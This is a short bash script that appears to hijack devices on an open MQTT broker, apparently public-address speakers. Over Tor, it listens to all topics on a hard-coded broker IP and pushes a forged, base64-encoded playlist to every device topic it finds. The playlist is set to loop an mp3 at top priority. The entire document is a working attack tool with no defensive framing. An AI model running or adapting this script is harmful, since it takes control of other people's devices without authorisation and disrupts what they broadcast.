#!/bin/bash
# HIJACK_ALL_VOV.sh - Peppe.mp3 LOOP

PEPPER_PAYLOAD='[
  {
    "id":51886,
    "show_id":51886,
    "show_info":"eyJtaWQiOjUxODg2LCJ2ZXJzaW9uIjoxLCJwcmlvIjo5OTksInN1bW1hcnkiOiJQZXBwZS5tcDMgSElKQUNLLVZPVjMiLCJtb2RlIjoxLCJyZXBlYXQiOjEsImRheXMiOjIxNDc0ODM2MzIsInRzIjpbMTcyODAwXSwiZHMiOlsxNzI4MCwxNzI4MF0sImNyZWF0ZWQiOjE3Njc2MzUwMDAsInN0YXJ0IjoxNzY3NjMyNDAwLCJleHBpcmVkIjoxNzY5ODc4Nzk5LCJmaWxlcyI6W3siaWQiOjUxODg2LCJpbmRleCI6MCwidHlwZSI6MSwic2l6ZSI6MTIzNDU2LCJzcyI6MTIzNDU2LCJ1cmwiOiJodHRwczovL3d3dy5teWluc3RhbnRzLmNvbS9tZWRpYS9zb3VuZHMvcGVwcGUtYnJlc2NpYS1wb2V0YS5tcDMifV19",
    "action":1,
    "description":"peppe-brescia-poeta.mp3",
    "version":1,
    "created_at":"2026-01-06T01:00:00.000000000+07:00"
  }
]'

while read -r line; do
  if [[ $line =~ \"n\":\"([0-9]{17}):[sd]:[0-9]+\" ]]; then
    TOPIC="${BASH_REMATCH[1]}:d:16"
    torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "$TOPIC" -m "$PEPPER_PAYLOAD" >/dev/null 2>&1 &
  fi
done < <(torsocks mosquitto_sub -h 42.1.64.56 -p 1883 -t '#' 2>/dev/null)
